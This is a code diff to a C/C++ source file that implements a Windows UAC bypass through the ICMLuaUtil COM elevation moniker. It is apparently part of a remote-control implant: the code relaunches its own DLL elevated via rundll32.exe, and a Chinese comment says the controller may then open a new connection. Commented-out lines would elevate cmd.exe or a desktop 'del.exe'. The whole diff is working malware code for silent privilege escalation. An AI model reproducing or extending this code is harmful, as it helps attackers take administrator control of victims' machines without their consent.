@@ -1,6 +1,8 @@
 #include "pch.h"
 
 #include "uac_bypass.h"
+#include "dllmain.h"
+#include "runtime/utils.h"
 
 static HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid)
 {
@@ -30,7 +32,7 @@ static HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, 
 	return hr;
 }
 
-BOOL CMLuaUtilBypassUAC(LPCWSTR lpwszExecutable, LPCWSTR parameter)
+BOOL BypassUAC(LPCWSTR lpwszExecutable, LPCWSTR parameter)
 {
 	HRESULT hr = 0;
 	CLSID clsidICMLuaUtil = { 0 };
@@ -63,13 +65,12 @@ BOOL CMLuaUtilBypassUAC(LPCWSTR lpwszExecutable, LPCWSTR parameter)
 }
 
 // 通过提权的方法再调用一份提升权限后的本dll, 控制段可能会建立新的连接.
-void bypassUAC()
+BOOL BypassUAC(LPCWSTR self_cmd)
 {
-	wchar_t szModule[MAX_PATH+12];
-	GetModuleFileName(NULL, szModule, MAX_PATH);
-	lstrcat(szModule, L",EntryPoint");
-	CMLuaUtilBypassUAC(L"C:\\Windows\\System32\\rundll32.exe", szModule);
-	//CMLuaUtilBypassUAC((LPWSTR)L"C:\\Users\\warren\\Desktop\\del.exe", NULL);
-	//CMLuaUtilBypassUAC((LPWSTR)L"C:\\Windows\\System32\\cmd.exe", NULL);
+	wchar_t* p = lstrcat_heap(module_path, L",EntryPoint ");
+	LPWSTR parameter = lstrcat_heap(p, self_cmd);
+	//BypassUAC((LPWSTR)L"C:\\Users\\warren\\Desktop\\del.exe", NULL);
+	//BypassUAC((LPWSTR)L"C:\\Windows\\System32\\cmd.exe", NULL);
+	return BypassUAC(L"C:\\Windows\\System32\\rundll32.exe", parameter);
 }
 
